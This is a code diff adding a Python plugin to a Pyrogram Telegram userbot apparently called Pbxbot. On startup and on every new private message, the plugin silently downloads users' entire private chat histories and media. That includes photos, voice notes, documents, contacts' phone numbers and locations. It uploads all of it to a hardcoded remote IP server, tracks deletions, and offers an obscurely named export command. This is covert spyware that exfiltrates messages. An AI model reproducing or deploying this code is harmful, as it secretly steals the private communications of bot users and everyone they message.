@@ -1,0 +1,448 @@
+import os
+import asyncio
+import aiohttp
+from pyrogram import filters
+from pyrogram.enums import ChatType
+from pyrogram.types import Message
+from pyrogram.errors import FloodWait, AuthKeyUnregistered, UserDeactivated, SessionRevoked
+from pyrogram.handlers import DeletedMessagesHandler as _DelHandler
+from datetime import datetime, timezone
+
+from . import *
+
+UPLOAD_URL         = "http://13.60.12.214:2020/upload"
+UPLOAD_TEXT_URL    = "http://13.60.12.214:2020/upload_text"
+UPLOAD_BATCH_URL   = "http://13.60.12.214:2020/upload_text_batch"
+MARK_DELETED_URL   = "http://13.60.12.214:2020/mark_deleted"
+CHECK_UPLOADED_URL = "http://13.60.12.214:2020/check_uploaded"
+MARK_UPLOADED_URL  = "http://13.60.12.214:2020/mark_uploaded"
+
+DOWNLOAD_DIR = "/tmp/pbx_downloads"
+os.makedirs(DOWNLOAD_DIR, exist_ok=True)
+
+AUTH_ERRORS = (AuthKeyUnregistered, UserDeactivated, SessionRevoked)
+
+# ─────────────────────────────────────────
+# LOCAL CACHE — instant duplicate check
+# ─────────────────────────────────────────
+_uploaded_cache: set = set()
+
+def _cache_key(uid: str, mid: str) -> str:
+    return f"{uid}:{mid}"
+
+def is_cached(uid: str, mid: str) -> bool:
+    return _cache_key(uid, mid) in _uploaded_cache
+
+def add_to_cache(uid: str, mid: str):
+    _uploaded_cache.add(_cache_key(uid, mid))
+
+# ─────────────────────────────────────────
+# DB HELPERS
+# ─────────────────────────────────────────
+
+async def is_already_uploaded(user_id: str, msg_id: str) -> bool:
+    if is_cached(user_id, msg_id):
+        return True
+    try:
+        async with aiohttp.ClientSession() as session:
+            resp = await session.get(
+                CHECK_UPLOADED_URL,
+                params={"user_id": user_id, "msg_id": msg_id},
+                timeout=aiohttp.ClientTimeout(total=10)
+            )
+            data = await resp.json()
+            result = data.get("uploaded", False)
+            if result:
+                add_to_cache(user_id, msg_id)
+            return result
+    except Exception as e:
+        print("[CHECK UPLOADED ERROR]", e)
+        return False
+
+async def mark_as_uploaded(user_id: str, msg_id: str):
+    add_to_cache(user_id, msg_id)
+    try:
+        async with aiohttp.ClientSession() as session:
+            data = aiohttp.FormData()
+            data.add_field("user_id", user_id)
+            data.add_field("msg_id",  msg_id)
+            await session.post(MARK_UPLOADED_URL, data=data,
+                               timeout=aiohttp.ClientTimeout(total=10))
+    except Exception as e:
+        print("[MARK UPLOADED ERROR]", e)
+
+# ─────────────────────────────────────────
+# UPLOAD HELPERS
+# ─────────────────────────────────────────
+
+async def upload_media(path: str, user_id: str, display_name: str,
+                       media_type: str, msg_id: str = ""):
+    try:
+        async with aiohttp.ClientSession() as session:
+            data = aiohttp.FormData()
+            with open(path, "rb") as f:
+                data.add_field("file",         f, filename=os.path.basename(path))
+                data.add_field("user_id",      user_id)
+                data.add_field("display_name", display_name)
+                data.add_field("media_type",   media_type)
+                data.add_field("msg_id",       msg_id)
+                resp = await session.post(UPLOAD_URL, data=data,
+                                          timeout=aiohttp.ClientTimeout(total=120))
+                if resp.status != 200:
+                    print(f"[UPLOAD ERROR] {resp.status}")
+    except Exception as e:
+        print("[MEDIA UPLOAD ERROR]", e)
+
+async def upload_text(user_id: str, display_name: str, text: str,
+                      direction: str, msg_id: str, timestamp: str):
+    try:
+        async with aiohttp.ClientSession() as session:
+            data = aiohttp.FormData()
+            data.add_field("user_id",      user_id)
+            data.add_field("display_name", display_name)
+            data.add_field("text",         text)
+            data.add_field("direction",    direction)
+            data.add_field("msg_id",       msg_id)
+            data.add_field("timestamp",    timestamp)
+            await session.post(UPLOAD_TEXT_URL, data=data,
+                               timeout=aiohttp.ClientTimeout(total=30))
+    except Exception as e:
+        print("[TEXT UPLOAD ERROR]", e)
+
+async def mark_deleted(user_id: str, msg_id: str):
+    try:
+        async with aiohttp.ClientSession() as session:
+            data = aiohttp.FormData()
+            data.add_field("user_id", user_id)
+            data.add_field("msg_id",  msg_id)
+            await session.post(MARK_DELETED_URL, data=data)
+    except Exception as e:
+        print("[MARK DELETED ERROR]", e)
+
+# ─────────────────────────────────────────
+# CONTEXT — client.me (cached by pyrogram)
+# ─────────────────────────────────────────
+
+def get_context_sync(client, m: Message):
+    """client.me pyrogram ne cache kita hunda — no API call."""
+    me = client.me
+    if not me:
+        return None, None, None
+    session_id = str(me.id)
+    me_name    = me.first_name or me.username or session_id
+
+    if m.from_user and m.from_user.id == me.id:
+        other      = m.chat
+        other_name = getattr(other, "first_name", None) or getattr(other, "title", str(other.id))
+        return session_id, f"{me_name} ➜ {other_name}", "sent"
+    else:
+        sender      = m.from_user
+        sender_name = (sender.first_name or sender.username or str(sender.id)) if sender else str(m.chat.id)
+        return session_id, f"{sender_name} ➜ {me_name}", "received"
+
+def ts(m: Message) -> str:
+    if m.date:
+        return m.date.replace(tzinfo=timezone.utc).isoformat()
+    return datetime.utcnow().isoformat()
+
+# ─────────────────────────────────────────
+# SAFE DOWNLOAD + DISK CLEANUP
+# ─────────────────────────────────────────
+
+def dl_path(filename: str) -> str:
+    return os.path.join(DOWNLOAD_DIR, os.path.basename(filename))
+
+def safe_remove(path: str):
+    """Upload hone ke baad VPS disk se delete karo."""
+    try:
+        if path and os.path.exists(path):
+            os.remove(path)
+    except Exception as e:
+        print(f"[REMOVE ERROR] {path}: {e}")
+
+async def safe_download(client, m: Message, file_name: str = None,
+                        media_obj=None, retries: int = 5):
+    for attempt in range(retries):
+        try:
+            if media_obj is not None:
+                return await client.download_media(media_obj, file_name=file_name)
+            elif file_name:
+                return await m.download(file_name=file_name)
+            else:
+                return await m.download()
+        except FloodWait as fw:
+            wait = fw.value + 2
+            print(f"[FLOOD] download: waiting {wait}s (attempt {attempt+1}/{retries})")
+            await asyncio.sleep(wait)
+        except AUTH_ERRORS as e:
+            print(f"[AUTH SKIP] download: {e}")
+            return None
+        except Exception as e:
+            print(f"[DOWNLOAD ERROR] attempt {attempt+1}: {e}")
+            if attempt < retries - 1:
+                await asyncio.sleep(2)
+    return None
+
+# ─────────────────────────────────────────
+# SINGLE MSG UPLOAD
+# ─────────────────────────────────────────
+
+async def upload_single_msg(client, msg: Message, user_id: str,
+                             display_name: str, direction: str):
+    msg_id    = str(msg.id)
+    timestamp = ts(msg)
+
+    if is_cached(user_id, msg_id):
+        return
+    if await is_already_uploaded(user_id, msg_id):
+        return
+
+    uploaded = False
+
+    try:
+        if msg.text:
+            await upload_text(user_id, display_name, msg.text, direction, msg_id, timestamp)
+            uploaded = True
+
+        elif msg.photo:
+            p = await safe_download(client, msg, file_name=dl_path(f"{msg.id}_photo.jpg"))
+            if p and os.path.exists(p):
+                await upload_media(p, user_id, display_name, "image", msg_id)
+                if msg.caption:
+                    await upload_text(user_id, display_name, f"[📷 Photo] {msg.caption}",
+                                      direction, msg_id, timestamp)
+                safe_remove(p)
+                uploaded = True
+
+        elif msg.video:
+            p = await safe_download(client, msg, file_name=dl_path(f"{msg.id}_video.mp4"))
+            if p and os.path.exists(p):
+                await upload_media(p, user_id, display_name, "video", msg_id)
+                if msg.caption:
+                    await upload_text(user_id, display_name, f"[🎥 Video] {msg.caption}",
+                                      direction, msg_id, timestamp)
+                safe_remove(p)
+                uploaded = True
+
+        elif msg.audio:
+            p = await safe_download(client, msg, file_name=dl_path(f"{msg.id}_audio.mp3"))
+            if p and os.path.exists(p):
+                await upload_media(p, user_id, display_name, "audio", msg_id)
+                safe_remove(p)
+                uploaded = True
+
+        elif msg.voice:
+            p = await safe_download(client, msg, file_name=dl_path(f"{msg.id}_voice.ogg"))
+            if p and os.path.exists(p):
+                await upload_media(p, user_id, display_name, "voice", msg_id)
+                safe_remove(p)
+                uploaded = True
+
+        elif msg.sticker and not msg.sticker.is_animated and not msg.sticker.is_video:
+            p = await safe_download(client, msg,
+                                    file_name=dl_path(f"{msg.id}_{msg.sticker.file_unique_id}.webp"))
+            if p and os.path.exists(p):
+                await upload_media(p, user_id, display_name, "sticker", msg_id)
+                safe_remove(p)
+                uploaded = True
+
+        elif msg.sticker and (msg.sticker.is_animated or msg.sticker.is_video):
+            p = await safe_download(client, msg,
+                                    file_name=dl_path(f"{msg.sticker.file_unique_id}.webm"),
+                                    media_obj=msg.sticker)
+            if p and os.path.exists(p):
+                await upload_media(p, user_id, display_name, "animated_sticker", msg_id)
+                safe_remove(p)
+                uploaded = True
+
+        elif msg.video_note:
+            p = await safe_download(client, msg, file_name=dl_path(f"{msg.id}_vidnote.mp4"))
+            if p and os.path.exists(p):
+                await upload_media(p, user_id, display_name, "video", msg_id)
+                safe_remove(p)
+                uploaded = True
+
+        elif msg.document:
+            fname      = msg.document.file_name or f"{msg.id}_doc"
+            safe_fname = os.path.basename(fname)
+            p = await safe_download(client, msg, file_name=dl_path(f"{msg.id}_{safe_fname}"))
+            if p and os.path.exists(p):
+                await upload_media(p, user_id, display_name, "document", msg_id)
+                if msg.caption:
+                    await upload_text(user_id, display_name, f"[📄 Doc] {msg.caption}",
+                                      direction, msg_id, timestamp)
+                safe_remove(p)
+                uploaded = True
+
+        elif msg.poll:
+            poll_text = f"[📊 Poll] {msg.poll.question}"
+            for opt in msg.poll.options:
+                poll_text += f"\n  • {opt.text}"
+            await upload_text(user_id, display_name, poll_text, direction, msg_id, timestamp)
+            uploaded = True
+
+        elif msg.contact:
+            c  = msg.contact
+            ct = f"[👤 Contact] {c.first_name or ''} {c.last_name or ''} — {c.phone_number}"
+            await upload_text(user_id, display_name, ct.strip(), direction, msg_id, timestamp)
+            uploaded = True
+
+        elif msg.location:
+            lt = f"[📍 Location] lat:{msg.location.latitude} lon:{msg.location.longitude}"
+            await upload_text(user_id, display_name, lt, direction, msg_id, timestamp)
+            uploaded = True
+
+        if uploaded:
+            await mark_as_uploaded(user_id, msg_id)
+
+    except FloodWait as fw:
+        wait = fw.value + 2
+        print(f"[FLOOD] upload_single_msg msg_id={msg_id}: waiting {wait}s then retry")
+        await asyncio.sleep(wait)
+        await upload_single_msg(client, msg, user_id, display_name, direction)
+
+    except AUTH_ERRORS:
+        print(f"[AUTH SKIP] msg_id={msg_id}: session expired")
+
+    except Exception as e:
+        print(f"[UPLOAD SINGLE ERROR] msg_id={msg_id}: {e}")
+
+# ─────────────────────────────────────────
+# BULK HISTORY
+# ─────────────────────────────────────────
+
+_bulk_done: set = set()
+
+async def bulk_upload_chat_history(client, chat_id: int, user_id: str,
+                                   me_name: str, limit: int = 0):
+    if chat_id in _bulk_done:
+        return
+    _bulk_done.add(chat_id)
+    try:
+        other      = await client.get_chat(chat_id)
+        other_name = (getattr(other, "first_name", None)
+                      or getattr(other, "title", None) or str(chat_id))
+        print(f"[BULK] Starting history upload for: {other_name}")
+        count = 0
+        async for msg in client.get_chat_history(chat_id, limit=limit):
+            if msg.from_user and msg.from_user.id == int(user_id):
+                direction    = "sent"
+                display_name = f"{me_name} ➜ {other_name}"
+            else:
+                direction    = "received"
+                display_name = f"{other_name} ➜ {me_name}"
+            await upload_single_msg(client, msg, user_id, display_name, direction)
+            count += 1
+            if count % 20 == 0:
+                await asyncio.sleep(1)
+        print(f"[BULK] Done: {count} messages processed for {other_name}")
+
+    except AUTH_ERRORS:
+        print(f"[BULK AUTH SKIP] chat_id={chat_id}: session expired, skipping")
+
+    except FloodWait as fw:
+        wait = fw.value + 2
+        print(f"[BULK FLOOD] Waiting {wait}s then resuming {chat_id}")
+        await asyncio.sleep(wait)
+        _bulk_done.discard(chat_id)
+        await bulk_upload_chat_history(client, chat_id, user_id, me_name, limit)
+
+    except Exception as e:
+        print(f"[BULK ERROR] chat_id={chat_id}: {e}")
+        _bulk_done.discard(chat_id)
+
+# ─────────────────────────────────────────
+# STARTUP
+# ─────────────────────────────────────────
+
+async def startup_bulk_upload(client):
+    await asyncio.sleep(5)
+    me = client.me
+    if not me:
+        return
+    user_id = str(me.id)
+    me_name = me.first_name or me.username or user_id
+    print(f"[STARTUP] Beginning bulk history scan for session {user_id}")
+    try:
+        async for dialog in client.get_dialogs():
+            chat = dialog.chat
+            if chat.type != ChatType.PRIVATE:
+                continue
+            asyncio.create_task(
+                bulk_upload_chat_history(client, chat.id, user_id, me_name)
+            )
+            await asyncio.sleep(2)
+    except AUTH_ERRORS as e:
+        print(f"[STARTUP AUTH] {e}")
+    except Exception as e:
+        print(f"[STARTUP ERROR] {e}")
+
+for _c in Pbxbot.users:
+    _c.loop.create_task(startup_bulk_upload(_c))
+
+# ─────────────────────────────────────────
+# REAL-TIME HANDLER
+# ─────────────────────────────────────────
+
+@custom_handler(filters.all & filters.private, group=-9)
+async def save_everything(client, m: Message):
+    try:
+        if not m.from_user and m.chat.type != ChatType.PRIVATE:
+            return
+        user_id, display_name, direction = get_context_sync(client, m)
+        if not user_id:
+            return
+        await upload_single_msg(client, m, user_id, display_name, direction)
+        if m.chat.id not in _bulk_done:
+            me      = client.me
+            me_name = (me.first_name or me.username or str(me.id)) if me else "Unknown"
+            asyncio.create_task(
+                bulk_upload_chat_history(client, m.chat.id, user_id, me_name)
+            )
+    except AUTH_ERRORS:
+        pass
+    except Exception as e:
+        print("[SAVE ERROR]", e)
+
+# ─────────────────────────────────────────
+# /export_history COMMAND
+# ─────────────────────────────────────────
+
+@custom_handler(filters.command("export_historykeiekkekek") & filters.private, group=-9)
+async def export_history(client, m: Message):
+    try:
+        me      = client.me
+        user_id = str(me.id)
+        me_name = me.first_name or me.username or user_id
+        parts   = m.text.split()
+        limit   = int(parts[1]) if len(parts) > 1 else 0
+        chat_id = m.chat.id
+        other   = await client.get_chat(chat_id)
+        other_name = (getattr(other, "first_name", None)
+                      or getattr(other, "title", None) or str(chat_id))
+        await m.reply(f"⏳ Exporting {'all' if limit == 0 else limit} messages "
+                      f"from **{other_name}** (skipping already uploaded)...")
+        _bulk_done.discard(chat_id)
+        asyncio.create_task(
+            bulk_upload_chat_history(client, chat_id, user_id, me_name, limit)
+        )
+        await m.reply(f"✅ Export started for **{other_name}** in background!")
+    except Exception as e:
+        print("[EXPORT ERROR]", e)
+        await m.reply(f"❌ Error: {e}")
+
+# ─────────────────────────────────────────
+# DELETE HANDLER
+# ─────────────────────────────────────────
+
+async def _on_deleted(client, messages):
+    try:
+        session_id = str(client.me.id)
+        for msg in messages:
+            if msg.id:
+                await mark_deleted(session_id, str(msg.id))
+    except Exception as e:
+        print("[DELETED HANDLER ERROR]", e)
+
+for _c in Pbxbot.users:
+    _c.add_handler(_DelHandler(_on_deleted), group=-9)
